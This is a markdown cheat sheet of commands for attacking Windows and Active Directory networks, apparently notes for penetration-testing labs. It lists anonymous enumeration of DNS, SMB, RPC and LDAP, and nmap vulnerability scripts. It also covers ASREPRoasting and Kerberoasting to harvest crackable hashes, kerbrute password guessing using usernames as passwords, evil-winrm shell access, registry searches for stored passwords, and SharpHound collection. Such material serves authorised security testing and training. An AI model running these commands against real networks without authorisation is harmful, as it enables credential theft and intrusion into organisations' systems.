# Windows 

## Enumeration without credentials
### DNS zone transfer

	host -l domain.name dnsserver
	
	dig axfr domain.name @dnsserver
	
	dnsrecon -d domain.name -t axfr
	
### SMB Anonymous Shares

	smbclient -L //server -N
	
### Anonymous RPC

	rpcclient -U "" -N <host or IP>
	
	enumdomusers
	as well as other ones, help for commands

### LDAP

	ldapsearch -h <host or IP> -p 389 -x -b 'dc=example,dc=com'
	
### Enum4linux

	enum4linux -a <host or IP>
	
### nmap 
        
	nmap -p 139,445 --script smb-vuln* <host or IP>
	
### ASREPRoast

Requires that you harvest a list of users first, from one of the above.

	GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
	
### kerbrute

If all else fails, try to brute force the users you gathered.  You can always try usernames as passwords
https://github.com/TarlogicSecurity/kerbrute

	kerbrute.py -users users.txt -passwords users.txt -domain <domain> -dc-ip <IP>
	
## Enumeration with credentials or post initial shell

### Shell

If WinRM is listening and exposed

	evil-winrm -u <username> -p <password> -i <host or IP>
	
### Get groups and privs

	whoami /all
	
### Passwords in registry

	reg query HKLM /f password /t REG_SZ /s
	
### Your favorite priv escalation script

	https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat
	
### Search for files

	Get-Childitem –Path <Folder> -File -Recurse -ErrorAction SilentlyContinue -Include *<search pattern>*
	
### Kerberos

#### Kerberoasting

	GetUserSPNs.py domain.name/user:password -outputfile kerbroast.txt
	
#### Bloodhound

Use WinRM, meterpreter, etc. to upload SharpHound.ps1

	.\SharpHound.ps1 -CollectionMethod all
	
Download the zip file and import into Bloodhound and go from there.
